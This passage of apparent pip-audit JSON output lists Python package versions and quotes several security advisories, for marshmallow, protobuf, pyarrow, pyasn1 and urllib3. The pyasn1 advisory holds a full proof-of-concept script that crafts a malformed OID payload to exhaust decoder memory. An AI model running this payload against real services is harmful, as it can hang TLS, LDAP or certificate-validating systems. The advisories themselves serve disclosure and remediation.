{"name": "langchainhub", "version": "0.1.21", "vulns": []}, {"name": "langsmith", "version": "0.3.45", "vulns": []}, {"name": "librt", "version": "0.7.3", "vulns": []}, {"name": "license-expression", "version": "30.4.4", "vulns": []}, {"name": "logistro", "version": "2.0.1", "vulns": []}, {"name": "loguru", "version": "0.7.3", "vulns": []}, {"name": "lxml", "version": "6.0.2", "vulns": []}, {"name": "markdown-it-py", "version": "4.0.0", "vulns": []}, {"name": "markupsafe", "version": "3.0.3", "vulns": []}, {"name": "marshmallow", "version": "3.26.1", "vulns": [{"id": "CVE-2025-68480", "fix_versions": ["3.26.2", "4.1.2"], "aliases": ["GHSA-428g-f7cq-pgp5"], "description": "### Impact  `Schema.load(data, many=True)` is vulnerable to denial of service attacks. A moderately sized request can consume a disproportionate amount of CPU time.  ### Patches  4.1.2, 3.26.2  ### Workarounds  ```py # Fail fast def load_many(schema, data, **kwargs):     if not isinstance(data, list):         raise ValidationError(['Invalid input type.'])     return [schema.load(item, **kwargs) for item in data] ```"}]}, {"name": "mccabe", "version": "0.7.0", "vulns": []}, {"name": "mdurl", "version": "0.1.2", "vulns": []}, {"name": "ml-dtypes", "version": "0.5.4", "vulns": []}, {"name": "mmh3", "version": "4.1.0", "vulns": []}, {"name": "mpmath", "version": "1.3.0", "vulns": []}, {"name": "msgpack", "version": "1.1.2", "vulns": []}, {"name": "multidict", "version": "6.7.0", "vulns": []}, {"name": "mypy", "version": "1.19.0", "vulns": []}, {"name": "mypy-extensions", "version": "1.1.0", "vulns": []}, {"name": "narwhals", "version": "2.10.2", "vulns": []}, {"name": "nodeenv", "version": "1.10.0", "vulns": []}, {"name": "numpy", "version": "1.26.4", "vulns": []}, {"name": "oauthlib", "version": "3.3.1", "vulns": []}, {"name": "onnx", "version": "1.19.1", "vulns": []}, {"name": "onnxruntime", "version": "1.18.1", "vulns": []}, {"name": "openai", "version": "1.55.3", "vulns": []}, {"name": "openpyxl", "version": "3.1.5", "vulns": []}, {"name": "opentelemetry-api", "version": "1.27.0", "vulns": []}, {"name": "opentelemetry-exporter-otlp-proto-common", "version": "1.27.0", "vulns": []}, {"name": "opentelemetry-exporter-otlp-proto-grpc", "version": "1.27.0", "vulns": []}, {"name": "opentelemetry-proto", "version": "1.27.0", "vulns": []}, {"name": "opentelemetry-sdk", "version": "1.27.0", "vulns": []}, {"name": "opentelemetry-semantic-conventions", "version": "0.48b0", "vulns": []}, {"name": "orjson", "version": "3.11.4", "vulns": []}, {"name": "overrides", "version": "7.7.0", "vulns": []}, {"name": "packageurl-python", "version": "0.17.6", "vulns": []}, {"name": "packaging", "version": "24.2", "vulns": []}, {"name": "pandas", "version": "2.2.3", "vulns": []}, {"name": "pathspec", "version": "0.12.1", "vulns": []}, {"name": "pillow", "version": "10.4.0", "vulns": []}, {"name": "pip", "version": "25.3", "vulns": []}, {"name": "pip-api", "version": "0.0.34", "vulns": []}, {"name": "pip-audit", "version": "2.10.0", "vulns": []}, {"name": "pip-requirements-parser", "version": "32.0.1", "vulns": []}, {"name": "platformdirs", "version": "4.5.1", "vulns": []}, {"name": "plotly", "version": "5.18.0", "vulns": []}, {"name": "pluggy", "version": "1.6.0", "vulns": []}, {"name": "posthog", "version": "5.4.0", "vulns": []}, {"name": "pre-commit", "version": "4.5.1", "vulns": []}, {"name": "primp", "version": "0.15.0", "vulns": []}, {"name": "propcache", "version": "0.4.1", "vulns": []}, {"name": "proto-plus", "version": "1.26.1", "vulns": []}, {"name": "protobuf", "version": "4.25.3", "vulns": [{"id": "CVE-2025-4565", "fix_versions": ["4.25.8", "5.29.5", "6.31.1"], "aliases": ["GHSA-8qvm-5x2c-j2w7"], "description": "### Summary Any project that uses Protobuf pure-Python backend to parse untrusted Protocol Buffers data containing an arbitrary number of **recursive groups**, **recursive messages** or **a series of [`SGROUP`](https://protobuf.dev/programming-guides/encoding/#groups) tags** can be corrupted by exceeding the Python recursion limit.  Reporter: Alexis Challande, Trail of Bits Ecosystem Security Team [ecosystem@trailofbits.com](mailto:ecosystem@trailofbits.com)  Affected versions: This issue only affects the [pure-Python implementation](https://github.com/protocolbuffers/protobuf/tree/main/python#implementation-backends) of protobuf-python backend. This is the implementation when `PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION=python` environment variable is set or the default when protobuf is used from Bazel or pure-Python PyPi wheels. CPython PyPi wheels do not use pure-Python by default.  This is a Python variant of a [previous issue affecting protobuf-java](https://github.com/protocolbuffers/protobuf/security/advisories/GHSA-735f-pc8j-v9w8).  ### Severity This is a potential Denial of Service. Parsing nested protobuf data creates unbounded recursions that can be abused by an attacker.  ### Proof of Concept For reproduction details, please refer to the unit tests [decoder_test.py](https://github.com/protocolbuffers/protobuf/blob/main/python/google/protobuf/internal/decoder_test.py#L87-L98) and [message_test](https://github.com/protocolbuffers/protobuf/blob/main/python/google/protobuf/internal/message_test.py#L1436-L1478)  ### Remediation and Mitigation A mitigation is available now. Please update to the latest available versions of the following packages: * protobuf-python(4.25.8, 5.29.5, 6.31.1)"}]}, {"name": "py-rust-stemmers", "version": "0.1.5", "vulns": []}, {"name": "py-serializable", "version": "2.1.0", "vulns": []}, {"name": "pyarrow", "version": "16.1.0", "vulns": [{"id": "PYSEC-2024-161", "fix_versions": ["17.0.0"], "aliases": ["CVE-2024-52338"], "description": "Deserialization of untrusted data in IPC and Parquet readers in the Apache Arrow R package versions\u00a04.0.0 through 16.1.0 allows arbitrary code execution. An application is vulnerable if it  reads Arrow IPC, Feather or Parquet data from untrusted sources (for  example, user-supplied input files). This vulnerability only affects the arrow R package, not other Apache Arrow  implementations or bindings unless those bindings are specifically used via the R package (for example, an R application that embeds a Python interpreter and uses PyArrow to read files from untrusted sources is still vulnerable if the arrow R package is an affected version). It is recommended that users of the arrow R package upgrade to 17.0.0 or later. Similarly, it  is recommended that downstream libraries upgrade their dependency  requirements to arrow 17.0.0 or later. If using an affected version of the package, untrusted data can read into a Table and its internal to_data_frame() method can be used as a workaround (e.g., read_parquet(..., as_data_frame = FALSE)$to_data_frame()).   This issue affects the Apache Arrow R package: from 4.0.0 through 16.1.0.   Users are recommended to upgrade to version 17.0.0, which fixes the issue."}]}, {"name": "pyasn1", "version": "0.6.1", "vulns": [{"id": "CVE-2026-23490", "fix_versions": ["0.6.2"], "aliases": ["GHSA-63vm-454h-vhhq"], "description": "### Summary  After reviewing pyasn1 v0.6.1 a Denial-of-Service issue has been found that leads to memory exhaustion from malformed RELATIVE-OID with excessive continuation octets.  ### Details  The integer issue can be found in the decoder as `reloid += ((subId << 7) + nextSubId,)`: https://github.com/pyasn1/pyasn1/blob/main/pyasn1/codec/ber/decoder.py#L496  ### PoC  For the DoS: ```py import pyasn1.codec.ber.decoder as decoder import pyasn1.type.univ as univ import sys import resource  # Deliberately set memory limit to display PoC try:     resource.setrlimit(resource.RLIMIT_AS, (100*1024*1024, 100*1024*1024))     print(\"[*] Memory limit set to 100MB\") except:     print(\"[-] Could not set memory limit\")  # Test with different payload sizes to find the DoS threshold payload_size_mb = int(sys.argv[1])  print(f\"[*] Testing with {payload_size_mb}MB payload...\")  payload_size = payload_size_mb * 1024 * 1024 # Create payload with continuation octets # Each 0x81 byte indicates continuation, causing bit shifting in decoder payload = b'\\x81' * payload_size + b'\\x00' length = len(payload)  # DER length encoding (supports up to 4GB) if length < 128:     length_bytes = bytes([length]) elif length < 256:     length_bytes = b'\\x81' + length.to_bytes(1, 'big') elif length < 256**2:     length_bytes = b'\\x82' + length.to_bytes(2, 'big') elif length < 256**3:     length_bytes = b'\\x83' + length.to_bytes(3, 'big') else:     # 4 bytes can handle up to 4GB     length_bytes = b'\\x84' + length.to_bytes(4, 'big')  # Use OID (0x06) for more aggressive parsing malicious_packet = b'\\x06' + length_bytes + payload  print(f\"[*] Packet size: {len(malicious_packet) / 1024 / 1024:.1f} MB\")  try:     print(\"[*] Decoding (this may take time or exhaust memory)...\")     result = decoder.decode(malicious_packet, asn1Spec=univ.ObjectIdentifier())      print(f'[+] Decoded successfully')     print(f'[!] Object size: {sys.getsizeof(result[0])} bytes')      # Try to convert to string     print('[*] Converting to string...')     try:         str_result = str(result[0])         print(f'[+] String succeeded: {len(str_result)} chars')         if len(str_result) > 10000:             print(f'[!] MEMORY EXPLOSION: {len(str_result)} character string!')     except MemoryError:         print(f'[-] MemoryError during string conversion!')     except Exception as e:         print(f'[-] {type(e).__name__} during string conversion')  except MemoryError:     print('[-] MemoryError: Out of memory!') except Exception as e:     print(f'[-] Error: {type(e).__name__}: {e}')   print(\"\\n[*] Test completed\") ```   Screenshots with the results:  #### DoS <img width=\"944\" height=\"207\" alt=\"Screenshot_20251219_160840\" src=\"https://github.com/user-attachments/assets/68b9566b-5ee1-47b0-a269-605b037dfc4f\" />  <img width=\"931\" height=\"231\" alt=\"Screenshot_20251219_152815\" src=\"https://github.com/user-attachments/assets/62eacf4f-eb31-4fba-b7a8-e8151484a9fa\" />  #### Leak analysis  A potential heap leak was investigated but came back clean: ``` [*] Creating 1000KB payload... [*] Decoding with pyasn1... [*] Materializing to string... [+] Decoded 2157784 characters [+] Binary representation: 896001 bytes [+] Dumped to heap_dump.bin  [*] First 64 bytes (hex):   01020408102040810204081020408102040810204081020408102040810204081020408102040810204081020408102040810204081020408102040810204081  [*] First 64 bytes (ASCII/hex dump):   0000: 01 02 04 08 10 20 40 81 02 04 08 10 20 40 81 02  ..... @..... @..   0010: 04 08 10 20 40 81 02 04 08 10 20 40 81 02 04 08  ... @..... @....   0020: 10 20 40 81 02 04 08 10 20 40 81 02 04 08 10 20  . @..... @.....    0030: 40 81 02 04 08 10 20 40 81 02 04 08 10 20 40 81  @..... @..... @.  [*] Digit distribution analysis:   '0':  10.1%   '1':   9.9%   '2':  10.0%   '3':   9.9%   '4':   9.9%   '5':  10.0%   '6':  10.0%   '7':  10.0%   '8':   9.9%   '9':  10.1% ```  ### Scenario  1. An attacker creates a malicious X.509 certificate. 2. The application validates certificates. 3. The application accepts the malicious certificate and tries decoding resulting in the issues mentioned above.  ### Impact  This issue can affect resource consumption and hang systems or stop services. This may affect: - LDAP servers - TLS/SSL endpoints - OCSP responders - etc.  ### Recommendation  Add a limit to the allowed bytes in the decoder."}]}, {"name": "pyasn1-modules", "version": "0.4.2", "vulns": []}, {"name": "pybase64", "version": "1.4.2", "vulns": []}, {"name": "pycodestyle", "version": "2.14.0", "vulns": []}, {"name": "pydantic", "version": "2.12.4", "vulns": []}, {"name": "pydantic-core", "version": "2.41.5", "vulns": []}, {"name": "pydantic-settings", "version": "2.7.0", "vulns": []}, {"name": "pydeck", "version": "0.9.1", "vulns": []}, {"name": "pyflakes", "version": "3.4.0", "vulns": []}, {"name": "pygments", "version": "2.19.2", "vulns": []}, {"name": "pyparsing", "version": "3.2.5", "vulns": []}, {"name": "pypika", "version": "0.48.9", "vulns": []}, {"name": "pyproject-hooks", "version": "1.2.0", "vulns": []}, {"name": "pyreadline3", "version": "3.5.4", "vulns": []}, {"name": "pystemmer", "version": "2.2.0.3", "vulns": []}, {"name": "pytest", "version": "8.4.2", "vulns": []}, {"name": "pytest-asyncio", "version": "1.3.0", "vulns": []}, {"name": "pytest-cov", "version": "7.0.0", "vulns": []}, {"name": "pytest-mock", "version": "3.15.1", "vulns": []}, {"name": "pytest-timeout", "version": "2.4.0", "vulns": []}, {"name": "python-dateutil", "version": "2.9.0.post0", "vulns": []}, {"name": "python-dotenv", "version": "1.2.1", "vulns": []}, {"name": "pytokens", "version": "0.3.0", "vulns": []}, {"name": "pytz", "version": "2025.2", "vulns": []}, {"name": "pyyaml", "version": "6.0.3", "vulns": []}, {"name": "pyzipcode", "version": "3.0.1", "vulns": []}, {"name": "referencing", "version": "0.37.0", "vulns": []}, {"name": "regex", "version": "2025.11.3", "vulns": []}, {"name": "reportlab", "version": "4.4.6", "vulns": []}, {"name": "requests", "version": "2.32.5", "vulns": []}, {"name": "requests-oauthlib", "version": "2.0.0", "vulns": []}, {"name": "requests-toolbelt", "version": "1.0.0", "vulns": []}, {"name": "rich", "version": "13.9.4", "vulns": []}, {"name": "rpds-py", "version": "0.20.0", "vulns": []}, {"name": "rsa", "version": "4.9.1", "vulns": []}, {"name": "ruff", "version": "0.6.8", "vulns": []}, {"name": "setuptools", "version": "80.9.0", "vulns": []}, {"name": "shellingham", "version": "1.5.4", "vulns": []}, {"name": "simplejson", "version": "3.20.2", "vulns": []}, {"name": "six", "version": "1.17.0", "vulns": []}, {"name": "smmap", "version": "5.0.2", "vulns": []}, {"name": "sniffio", "version": "1.3.1", "vulns": []}, {"name": "snowballstemmer", "version": "2.2.0", "vulns": []}, {"name": "sortedcontainers", "version": "2.4.0", "vulns": []}, {"name": "sqlalchemy", "version": "2.0.44", "vulns": []}, {"name": "starlette", "version": "0.50.0", "vulns": []}, {"name": "stevedore", "version": "5.6.0", "vulns": []}, {"name": "streamlit", "version": "1.37.0", "vulns": []}, {"name": "streamlit-folium", "version": "0.22.0", "vulns": []}, {"name": "sympy", "version": "1.14.0", "vulns": []}, {"name": "tabulate", "version": "0.9.0", "vulns": []}, {"name": "tenacity", "version": "8.5.0", "vulns": []}, {"name": "tiktoken", "version": "0.7.0", "vulns": []}, {"name": "tokenizers", "version": "0.22.1", "vulns": []}, {"name": "toml", "version": "0.10.2", "vulns": []}, {"name": "tomli", "version": "2.4.0", "vulns": []}, {"name": "tomli-w", "version": "1.2.0", "vulns": []}, {"name": "tornado", "version": "6.5.2", "vulns": []}, {"name": "tqdm", "version": "4.67.1", "vulns": []}, {"name": "typer", "version": "0.20.0", "vulns": []}, {"name": "types-requests", "version": "2.32.4.20250913", "vulns": []}, {"name": "typing-extensions", "version": "4.15.0", "vulns": []}, {"name": "typing-inspect", "version": "0.9.0", "vulns": []}, {"name": "typing-inspection", "version": "0.4.2", "vulns": []}, {"name": "tzdata", "version": "2025.2", "vulns": []}, {"name": "uritemplate", "version": "4.2.0", "vulns": []}, {"name": "urllib3", "version": "2.3.0", "vulns": [{"id": "CVE-2025-50182", "fix_versions": ["2.5.0"], "aliases": ["GHSA-48p4-8xcf-vxj5"], "description": "urllib3 [supports](https://urllib3.readthedocs.io/en/2.4.0/reference/contrib/emscripten.html) being used in a Pyodide runtime utilizing the [JavaScript Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) or falling back on [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest). This means you can use Python libraries to make HTTP requests from your browser or Node.js. Additionally, urllib3 provides [a mechanism](https://urllib3.readthedocs.io/en/2.4.0/user-guide.html#retrying-requests) to control redirects.  However, the `retries` and `redirect` parameters are ignored with Pyodide; the runtime itself determines redirect behavior.   ## Affected usages  Any code which relies on urllib3 to control the number of redirects for an HTTP request in a Pyodide runtime.   ## Impact  Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects may remain vulnerable if a Pyodide runtime redirect mechanism is unsuitable.   ## Remediation  If you use urllib3 in Node.js, upgrade to a patched version of urllib3.  Unfortunately, browsers provide no suitable way which urllib3 can use: `XMLHttpRequest` provides no control over redirects, the Fetch API returns `opaqueredirect` responses lacking data when redirects are controlled manually. Expect default browser behavior for redirects."}, {"id": "CVE-2025-50181", "fix_versions": ["2.5.0"], "aliases": ["GHSA-pq67-6m6q-mj2v"], "description": "urllib3 handles redirects and retries using the same mechanism, which is controlled by the `Retry` object. The most common way to disable redirects is at the request level, as follows:  ```python resp = urllib3.request(\"GET\", \"https://httpbin.org/redirect/1\", redirect=False) print(resp.status) # 302 ```  However, it is also possible to disable redirects, for all requests, by instantiating a `PoolManager` and specifying `retries` in a way that disable redirects:  ```python import urllib3  http = urllib3.PoolManager(retries=0)  # should raise MaxRetryError on redirect http = urllib3.PoolManager(retries=urllib3.Retry(redirect=0))  # equivalent to the above http = urllib3.PoolManager(retries=False)  # should return the first response  resp = http.request(\"GET\", \"https://httpbin.org/redirect/1\") ```  However, the `retries` parameter is currently ignored, which means all the above examples don't disable redirects.  ## Affected usages  Passing `retries` on `PoolManager` instantiation to disable redirects or restrict their number.  By default, requests and botocore users are not affected.  ## Impact  Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects at the PoolManager level will remain vulnerable.  ## Remediation  You can remediate this vulnerability with the following steps:   * Upgrade to a patched version of urllib3. If your organization would benefit from the continued support of urllib3 1.x, please contact [sethmichaellarson@gmail.com](mailto:sethmichaellarson@gmail.com) to discuss sponsorship or contribution opportunities.  * Disable redirects at the `request()` level instead of the `PoolManager()` level."}, {"id": "CVE-2025-66418", "fix_versions": ["2.6.0"], "aliases": ["GHSA-gm62-xv2j-4w53"], "description": "## Impact  urllib3 supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., `Content-Encoding: gzip, zstd`).  However, the number of links in the decompression chain was unbounded allowing a malicious server to insert a virtually unlimited number of compression steps leading to high CPU usage and massive memory allocation for the decompressed data.   ## Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier for HTTP requests to untrusted sources unless they disable content decoding explicitly.   ## Remediation  Upgrade to at least urllib3 v2.6.0 in which the library limits the number of links to 5.  If upgrading is not immediately possible, use [`preload_content=False`](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) and ensure that `resp.headers[\"content-encoding\"]` contains a safe number of encodings before reading the response content."}, {"id": "CVE-2025-66471", "fix_versions": ["2.6.0"], "aliases": ["GHSA-2xpw-w6gg-jr37"], "description": "### Impact  urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.  When streaming a compressed response, urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). The library must read compressed data from the network and decompress it until the requested chunk size is met. Any resulting decompressed data that exceeds the requested amount is held in an internal buffer for the next read operation.  The decompression logic could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This can result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data; CWE-409) on the client side, even if the application only requested a small chunk of data.   ### Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier to stream large compressed responses or content from untrusted sources.  `stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, `readinto(b)` are examples of `urllib3.HTTPResponse` method calls using the affected logic unless decoding is disabled explicitly.   ### Remediation  Upgrade to at least urllib3 v2.6.0 in which the library avoids decompressing data that exceeds the requested amount.  If your environment contains a package facilitating the Brotli encoding, upgrade to at least Brotli 1.2.0 or brotlicffi 1.2.0.0 too. These versions are enforced by the `urllib3[brotli]` extra in the patched versions of urllib3.   ### Credits  The issue was reported by @Cycloctane. Supplemental information was provided by @stamparm during a security audit performed by [7ASecurity](https://7asecurity.com/) and facilitated by [OSTIF](https://ostif.org/)."}, {"id": "CVE-2026-21441", "fix_versions": ["2.6.3"], "aliases": ["GHSA-38jv-5279-wg99"], "description": "### Impact  urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.6.2/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.  urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). When using the streaming API, the library decompresses only the necessary bytes, enabling partial content consumption.  However, for HTTP redirect responses, the library would read the entire response body to drain the connection and decompress the content unnecessarily. This decompression occurred even before any read methods were called, and configured read limits did not restrict the amount of decompressed data. As a result, there was no safeguard against decompression bombs. A malicious server could exploit this to trigger excessive resource consumption on the client (high CPU usage and large memory allocations for decompressed data; CWE-409).  ### Affected usages  Applications and libraries using urllib3 version 2.6.2 and earlier to stream content from untrusted sources by setting `preload_content=False` when they do not disable redirects.   ### Remediation  Upgrade to at least urllib3 v2.6.3 in which the library does not decode content of redirect responses when `preload_content=False`.  If upgrading is not immediately possible, disable [redirects](https://urllib3.readthedocs.io/en/2.6.2/user-guide.html#retrying-requests) by setting `redirect=False` for requests to untrusted source."}]}, {"name": "uvicorn", "version": "0.38.0", "vulns": []}, {"name": "validators", "version": "0.35.0", "vulns": []}, {"name": "virtualenv", "version": "20.36.1", "vulns": []}, {"name": "watchdog", "version": "4.0.2", "vulns": []}, {"name": "watchfiles", "version": "1.1.1", "vulns": []}, {"name": "websocket-client", "version": "1.9.0", "vulns": []}, {"name": "websockets", "version": "15.0.1", "vulns": []}, {"name": "wheel", "version": "0.45.1", "vulns": []}, {"name": "win32-setctime", "version": "1.2.0", "vulns": []}, {"name": "wrapt", "version": "2.0.1", "vulns": []}, {"name": "xyzservices", "version": "2025.10.0", "vulns": []}, {"name": "yarl", "version": "1.9.4", "vulns": []}, {"name": "zipp", "version": "3.23.0", "vulns": []}, {"name": "zstandard", "version": "0.23.0", "vulns": []}], "fixes": []}
 